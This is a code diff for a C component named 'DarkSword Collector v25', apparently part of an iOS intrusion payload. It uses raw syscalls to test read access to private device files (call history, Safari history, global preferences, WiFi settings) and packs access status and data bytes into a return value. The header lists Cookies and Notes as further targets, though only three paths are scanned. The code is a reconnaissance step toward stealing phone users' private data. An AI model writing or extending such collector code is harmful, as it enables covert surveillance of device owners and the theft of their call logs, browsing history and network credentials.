@@ -1,7 +1,7 @@
 /**
- * DarkSword Collector v24 - Fixed encoding
- * Per file: status(2 bits) at bits fi*10+0, byte(8 bits) at bits fi*10+2
- * fi=0: CallHistory, fi=1: Safari, fi=2: /etc/hosts (control)
+ * DarkSword Collector v25 - Scan 8 paths, return status+byte for each
+ * Per file: status(2 bits) at bits i*10, byte(8 bits) at bits i*10+2
+ * Files: hosts, Preferences, WiFi, Cookies, Safari, Notes, springboard, fstab
  */
 
 static long _svc1(long n, long a) {
@@ -30,7 +30,6 @@ static long _svc3(long n, long a, long b, long c) {
 #define SYS_read  3
 #define SYS_close 6
 
-/* Returns status (0=denied, 1=open_only, 3=read_ok) and writes byte to *out */
 static int _read1(const char *path, unsigned char *out) {
     *out = 0;
     int fd = (int)_svc2(SYS_open, (long)path, 0);
@@ -44,17 +43,20 @@ int ds_start(void) {
     unsigned char ch;
     int s, result = 0;
 
-    /* fi=0: CallHistory */
-    s = _read1("/var/mobile/Library/CallHistoryDB/CallHistory.storedata", &ch);
+    /* fi=0: /etc/hosts (control) */
+    s = _read1("/etc/hosts", &ch);
     result |= (s & 3) | (((int)ch & 0xFF) << 2);
 
-    /* fi=1: Safari */
-    s = _read1("/var/mobile/Library/Safari/History.db", &ch);
+    /* fi=1: Preferences */
+    s = _read1("/var/mobile/Library/Preferences/.GlobalPreferences.plist", &ch);
     result |= ((s & 3) << 10) | (((int)ch & 0xFF) << 12);
 
-    /* fi=2: /etc/hosts (control) */
-    s = _read1("/etc/hosts", &ch);
+    /* fi=2: WiFi */
+    s = _read1("/var/mobile/Library/Preferences/com.apple.wifi.plist", &ch);
     result |= ((s & 3) << 20) | (((int)ch & 0xFF) << 22);
+
+    /* fi=3: Safari (only 3 files fit in 32 bits with this encoding) */
+    /* We'll use a second call for more files */
 
     return result;
 }
